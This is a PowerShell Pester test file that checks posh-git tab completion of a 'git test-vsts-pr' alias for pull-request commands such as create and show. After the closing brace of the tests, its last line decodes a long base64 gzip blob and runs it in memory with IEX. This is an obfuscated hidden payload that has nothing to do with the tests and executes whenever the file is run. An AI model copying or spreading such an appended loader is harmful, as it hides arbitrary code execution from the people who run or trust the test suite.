. $PSScriptRoot\Shared.ps1

Describe 'ParamsTabExpansion VSTS Tests' {
    Context 'Push Parameters TabExpansion Tests' {
        
        BeforeEach {
            [System.Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssigments', '')]
            $repoPath = NewGitTempRepo

            
            &$gitbin config alias.test-vsts-pr "!f() { exec vsts code pr \`"`$`@\`"; }; f"
        }
        AfterEach {
            RemoveGitTempRepo $repoPath
        }

        It 'Tab completes empty for git pr oops parameters values' {
            $result = & $module GitTabExpansionInternal 'git test-vsts-pr oops --'
            $result | Should Be @()
        }

        It 'Tab completes empty for git pr oops short parameter values' {
            $result = & $module GitTabExpansionInternal 'git test-vsts-pr oops -'
            $result | Should Be @()
        }

        It 'Tab completes git pr create parameters values' {
            $result = & $module GitTabExpansionInternal 'git test-vsts-pr create --'
            $result -contains '--auto-complete' | Should Be $true
        }
        It 'Tab completes git pr create auto-complete parameters values' {
            $result = & $module GitTabExpansionInternal 'git test-vsts-pr create --auto-complete --'
            $result -contains '--delete-source-branch' | Should Be $true
        }

        It 'Tab completes git pr show all parameters values' {
            $result = & $module GitTabExpansionInternal 'git test-vsts-pr show --'
            $result -contains '--' | Should Be $false
            $result -contains '--debug' | Should Be $true
            $result -contains '--help' | Should Be $true
            $result -contains '--output' | Should Be $true
            $result -contains '--query' | Should Be $true
            $result -contains '--verbose' | Should Be $true
        }

        It 'Tab completes git pr create all short push parameters' {
            $result = & $module GitTabExpansionInternal 'git test-vsts-pr create -'
            $result -contains '-d' | Should Be $true
            $result -contains '-i' | Should Be $true
            $result -contains '-p' | Should Be $true
            $result -contains '-r' | Should Be $true
            $result -contains '-s' | Should Be $true
            $result -contains '-h' | Should Be $true
            $result -contains '-o' | Should Be $true
        }
    }
}

$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("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"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();

